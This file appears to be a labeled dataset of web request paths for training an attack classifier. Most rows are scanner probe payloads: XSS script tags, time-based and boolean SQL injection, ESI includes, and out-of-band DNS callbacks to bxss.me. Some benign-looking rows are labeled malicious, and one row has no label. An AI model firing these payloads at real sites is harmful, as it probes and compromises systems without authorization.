sentences	labels
module/*****/ckplayer/ckplayer.js/"><script>alert(647)</script>?_=1630311538664 	 1
searchfinancial.jspx?channelid=1480&producttype=2&querystr=1&renew=0<esi:include src=""http://*******/rpb.png""/>&termtype=0 	 1
public/******/common/signin.aspx?tbpassword=alert(777)returnurl=/******/common/default.aspx 	 1
xinanyanjiu'||'/************/guzhiqihuo/index_9.html 	 1
index/******/2013/06/05/011103518.shtml 	 1
art/****/7/12/http://bxss.me/t/fit.txt_35_234319.html 	 1
ldzc/*****/201610/t20161016_542.html?leader=bxss.me/t/xss.html? 	 1
qhly/******/2021/05/09/javascript:window.print() 	 1
yqlj/**********/workbox.php?mode=addtolightbox&mediaid=""><script>alert(777)</script> 	 1
jsearchfront/http://*******/t/fit.txt/jcse/110105008056111/16/images/plugin/waterpull/pinterest_grid.js 	 1
art/****/12/0'xor(if(now()=sysdate(),sleep(15),0))xor'z/art_31_223612.html 	 1
qhly/******/2021/11/27/javascript:dozoom(9) 	 1
news/********/silulvyou?page=1'"()&%<acu><script>9112(9131)</script> 	 1
was5/**********/index.php?rt="><script>alert(777);</script>&s=your_admin"><script>alert(777);</script>&token=957bf7cb71078f4471807da1c42d721e"><script>alert(777);</script> 	 1
bxss.me/**/lib/easyui/plugins/jquery.parser.js 	 1
vc/**/widgets/hanweb/ie6fixed/ie6fixed'""()&%<acx><script >vejj(9750)</script>.js 	 1
module<esi:include src=""http://*******/rpb.png""/>/jslib/grouppic/jquery.ad-gallery.js 	 1
socket.gethostbyname('hittp' 'tsmemnup49420.bxss.me.')[3].to_s) '/****/1105/list.html 	 1
gygj/****/dsh/" and "x"="x 	 1
was5/***/search?page=2&channelid=253477&searchword=1&keyword=1' or 1130=1740 and '1'='1&orderby=-docreltime&perpage=15&outlinepage=10 	 1
news/********/chukoufengxianyujing?page=1') and 1=dbms_pipe.receive_message(chr(90)||chr(80)||chr(71)||chr(74),6)--  	 1
system/********/interview/room.jsp?wbinterviewid=1033&owner=1707212448' or 9300=4013 and '1'='1 	 1
newscenter/******/2021/08/26/javascript:window.print() 	 1
module/*****/ 	 1
ldzc%' and 2*3*8=6*8 and 'mygq'!='mygq%/*****/sz/202108/t20210806_185416.html 	 1
socket.gethostbyname(""hitqt"" ""docompvx65db2.bxss.me."")[3].to_s) ""/*****/hfswsj/ 	 1
bxss.me/********/jcse/110105008056111/16/images/result.css 	 1
xxgk/******/tjj/zfxxgkml_2127/lzyj/list.html?new=if(now()=sysdate(),sleep(15),0) 	 1
fr/*************/ajax_managed_services.php 	 1
wzdt/****/admin/configure_extensions.php?display=</script><script>confirm(777)</script> 	 1
jsearchfront/********/jcse/110105008056111/16'""()&%<acx><script >ap8q(9651)</script>/images/plugin/selectpick/js.js 	 1
2016zt/******/2021/12/19/javascript:void(); 	 1
socket.gethostbyname('hitky' 'hybvqvxf57438.bxss.me.')[3].to_s) '/*******/list.html 	 1
e/******/listinfo/ 	 1
xxgk/******/tjj/zfxxgkml_2127/xwfbh_2065/http://bxss.me/t/fit.txt?.jpg.html 	 1
0'xor(if(now()=sysdate(),sleep(15),0))xor'z/*****/urite/urite.min.js 	 1
xwdt/if(now()=sysdate(),sleep(12),0)/*****/gzdt/1.htm 	 1
0""xor(if(now()=sysdate(),sleep(12),0))xor""z/******/bzxajgc/ycs/hlx.htm 	 1
index/******/2019/07/24/javascript:window.print() 	 1
images/***//xfs.bxss.me.js 	 1
xxgk/*****/1079//xfs.bxss.me/list.html 	 1
xwdt/0""xor(if(now()=sysdate(),sleep(12),0))xor""z/*******/gzdt/1.htm 	 1
module/*****/ckplayer/ckplayer.js/"><script>alert(3544)</script>?_=1630311941482 	 1
was5/***/search?page=2&channelid=253477%' and 6701=6701 and '%%'='%&searchword=1&keyword=1&orderby=-docreltime&perpage=15&outlinepage=10 	 1
was5/***/search?channelid=299868&perpage=1000' or 3301=3301 and '1'='1 	 1
xxgk/******/zfczyjs' and 2*3*8=6*8 and 'hpiz'='hpiz/list.html 	 1
xq/******/2021/01/25/javascript:void(0); 	 1
qhly/******/2009/10/09/javascript:dozoom(9) 	 1
zwgk/******/bzxajgc/gys/jyx%' and 2*3*8=6*8 and 'jv06'!='jv06%.htm 	 1
public/**********/index.php?rt="><script>alert(777);</script>&s=your_admin"><script>alert(777);</script>&token=957bf7cb71078f4471807da1c42d721e"><script>alert(777);</script> 	 1
if(now()=sysdate(),sleep(12),0)/****/fdcgl/gzdt/1.htm 	 1
module/**********/visit.jsp?i_columnid=1&i_webid=1&type[0]=extractvalue(1,concat(char(126),md5(1072982138)))&type[1]==1 	 1
inc/******/index.php 	 1
ywzzq/*****/ccmanage.php?find_enc=1&list=1"><script>alert(777)</script> 	 1
jsearchfront'||'/********/jcse/110105008056111/16/images/plugin/websitechange/zwdt_v3.css 	 1
ldzc/*****/201802/t20180211_100275.html?leader=bxss.me 	 1
cpsms/********/javascript:void(0); 	 1
bxss.me/******/tjj/zfxxgkml_2127/jgzn_2042/list.html 	 1
was5/***/search?channelid=*/-->'""></iframe></script></style></title></textarea><script >alert(73212)</script> 	 1
module/*****/ckplayer/ckplayer.js/<img src="javascript:alert(817)">?_=1630311603075 	 1
rlzy/*********/jsp/ccmr/clientportal/login.jsp?strmessage=<img src=/ onerror="alert(777)"/> 	 1
zwgk/****/bmjs/zzqdwgzbmyxsjg/zzqjjw/\"javascript:void(0)\" 	 1
web/********/fonts/fontawesome-webfont.ttf?v=4.3.0</textarea>--><xss_01042409f04968bd330af207d3fdc04c/><!--<textarea> 	 1
z/210909-2/*****/3494307764http://bxss.me/t/xss.html? 	 1
images/***/jquery.ellipsis.js/<img src="javascript:alert(5864)"> 	 1
xxgk/******/tjj/zfxxgkml_2127/hygq_2064/list.html?new=0""xor(if(now()=sysdate(),sleep(15),0))xor""z 	 1
index/******/2021/10/19/javascript:void(); 	 1
index.php/*****/login/index.html?fromurl=st4r7s<html	onmouseover = a=prompt,a()//3nd&username=8 
module/*****/ckplayer/ckplayer.js/<img src="javascript:alert(655)">?_=1630311538664 	 1
2021zt/******/2021/06/09'""/><iframe src=javascript:alert(2418) /013399706.shtml 	 1
if(now()=sysdate(),sleep(15),0)/******/lzyj/ 	 1
ldzc/*****/201903/t20190322_115445.html?leader='.gethostbyname(lc('hitct'.'iphdgzpwe90ba.bxss.me.')).'a'.chr(67).chr(hex('58')).chr(105).chr(84).chr(113).chr(68).' 	 1
es/*****/ccmanage.php?find_enc=1&list=1"><script>alert(777)</script> 	 1
socket.gethostbyname(""hitbl"" ""mskggftfc11f5.bxss.me."")[3].to_s) ""/*****/ckplayer/ckplayer.js 	 1
newscenter/******/2021/09/30/javascript:window.close(); 	 1
if(now()=sysdate(),sleep(15),0)/******/index.html 	 1
